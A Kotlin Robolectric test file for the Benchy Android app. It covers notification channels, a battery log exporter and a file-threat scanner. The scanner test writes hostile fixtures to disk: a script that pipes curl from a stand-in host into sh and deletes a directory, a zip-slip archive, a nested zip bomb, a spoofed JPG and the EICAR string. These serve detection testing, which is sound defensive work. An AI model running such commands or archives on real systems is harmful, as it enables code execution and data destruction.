package com.benchy.X

import android.app.NotificationManager
import android.content.ContentResolver
import android.content.Context
import android.media.AudioAttributes
import androidx.room.Room
import androidx.test.core.app.ApplicationProvider
import com.benchy.X.data.BatterySampleEntity
import com.benchy.X.data.BenchyDatabase
import com.benchy.X.data.BenchyRepository
import com.benchy.X.engine.FileSecurityAnalyzer
import com.benchy.X.engine.FileThreatCategory
import com.benchy.X.notifications.NotificationHelper
import com.benchy.X.notifications.SoundGenerator
import kotlinx.coroutines.runBlocking
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileOutputStream
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [35])
class ExampleRobolectricTest {

    @Test
    fun `app name and generated wav alerts exist`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val appName = context.getString(R.string.app_name)
        assertEquals("Benchy", appName)

        val (goodWav, badWav) = SoundGenerator.ensureSoundFiles(context)
        assertTrue(goodWav.exists() && goodWav.length() > 44)
        assertTrue(badWav.exists() && badWav.length() > 44)
    }

    @Test
    fun `notification channels use v6 bundled android resource sounds with notification usage`() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        NotificationHelper.initializeChannels(context)

        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val goodChannel = nm.getNotificationChannel(NotificationHelper.CHANNEL_GOOD_ALERTS)
        val badChannel = nm.getNotificationChannel(NotificationHelper.CHANNEL_BAD_ALERTS)

        assertNotNull(goodChannel)
        assertNotNull(badChannel)
        assertEquals("benchy_good_alerts_v6", goodChannel.id)
        assertEquals("benchy_bad_alerts_v6", badChannel.id)
        assertEquals(ContentResolver.SCHEME_ANDROID_RESOURCE, goodChannel.sound?.scheme)
        assertEquals(ContentResolver.SCHEME_ANDROID_RESOURCE, badChannel.sound?.scheme)
        assertEquals(AudioAttributes.USAGE_NOTIFICATION, goodChannel.audioAttributes.usage)
        assertEquals(AudioAttributes.USAGE_NOTIFICATION, badChannel.audioAttributes.usage)

        val diag = NotificationHelper.inspectNotificationAudioState(context)
        assertTrue(diag.channelHasSound)
        assertTrue(diag.channelImportanceOk)
    }

    @Test
    fun `battery txt exporter saves all logged samples as plain text`() = runBlocking {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val db = Room.inMemoryDatabaseBuilder(context, BenchyDatabase::class.java)
            .allowMainThreadQueries()
            .build()
        try {
            val repo = BenchyRepository(db)
            repo.insertBatterySample(
                BatterySampleEntity(
                    timestampMillis = 1_700_000_000_000L,
                    voltageMv = 4120,
                    currentMa = -310,
                    tempCelsius = 32.1f,
                    levelPercent = 84,
                    elapsedDays = 0.425f,
                    isCharging = false,
                    chargeCounterUah = 3_825_000,
                    powerMw = 1277.2f
                )
            )
            val txt = repo.exportBatterySamplesTxt()
            assertTrue(txt.contains("BENCHY — 1-WEEK BATTERY HEALTH & DRAIN LOG"))
            assertTrue(txt.contains("Total Samples Logged: 1"))
            assertTrue(txt.contains("4120 mV"))
            assertTrue(txt.contains("32.1°C"))
            assertTrue(txt.contains("Discharging"))
        } finally {
            db.close()
        }
    }

    @Test
    fun `file system crawler detects malicious payloads zip slip and zip bombs`() = runBlocking {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val crawlDir = File(context.filesDir, "crawler_test/nested").apply { mkdirs() }

        val eicarFile = File(crawlDir, "test_sample.txt")
        eicarFile.writeText("X5O!P%@AP[4\\PZX54(P^)7CC)7}\$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!\$H+H*")

        val badScript = File(crawlDir, "dropper.sh")
        badScript.writeText("#!/system/bin/sh\ncurl http://evil.invalid/x | sh\nrm -rf /data/local/tmp")

        val spoofedJpg = File(crawlDir, "photo.jpg")
        spoofedJpg.writeBytes(byteArrayOf('M'.code.toByte(), 'Z'.code.toByte(), 0x90.toByte(), 0x00))

        val zipSlipArchive = File(crawlDir, "traversal.zip")
        ZipOutputStream(FileOutputStream(zipSlipArchive)).use { zos ->
            zos.putNextEntry(ZipEntry("../../etc/evil.sh"))
            zos.write("echo pwned".toByteArray())
            zos.closeEntry()
        }

        // Valid high-ratio nested zip bomb (~60 KB compressed vs >120 MB declared? Even simpler: nested recursive zip bomb!)
        val innerBombBaos = ByteArrayOutputStream()
        ZipOutputStream(innerBombBaos).use { inner ->
            val zeros = ByteArray(1024 * 1024) // 1 MB of zeros compresses to ~1 KB (1000:1)
            for (i in 0 until 60) {
                inner.putNextEntry(ZipEntry("pad_$i.bin"))
                inner.write(zeros)
                inner.closeEntry()
            }
        }
        val nestedBombZip = File(crawlDir, "archive_bomb.zip")
        ZipOutputStream(FileOutputStream(nestedBombZip)).use { outer ->
            outer.putNextEntry(ZipEntry("layer1.zip"))
            outer.write(innerBombBaos.toByteArray())
            outer.closeEntry()
        }

        val scanResult = FileSecurityAnalyzer.scanDeviceFilesWithProgress(
            context = context,
            minDurationMs = 100L,
            onProgress = {}
        )

        assertTrue(scanResult.totalFilesInspected >= 5)
        assertTrue(scanResult.directoriesTraversed >= 2)

        val flaggedByName = scanResult.flaggedFiles.associateBy { it.fileName }
        assertEquals(FileThreatCategory.EICAR_TEST, flaggedByName["test_sample.txt"]?.category)
        assertEquals(FileThreatCategory.MALICIOUS_PAYLOAD, flaggedByName["dropper.sh"]?.category)
        assertEquals(FileThreatCategory.SPOOFED_EXTENSION, flaggedByName["photo.jpg"]?.category)
        assertEquals(FileThreatCategory.MALICIOUS_PAYLOAD, flaggedByName["traversal.zip"]?.category)
        assertEquals(FileThreatCategory.ZIP_BOMB, flaggedByName["archive_bomb.zip"]?.category)
    }
}
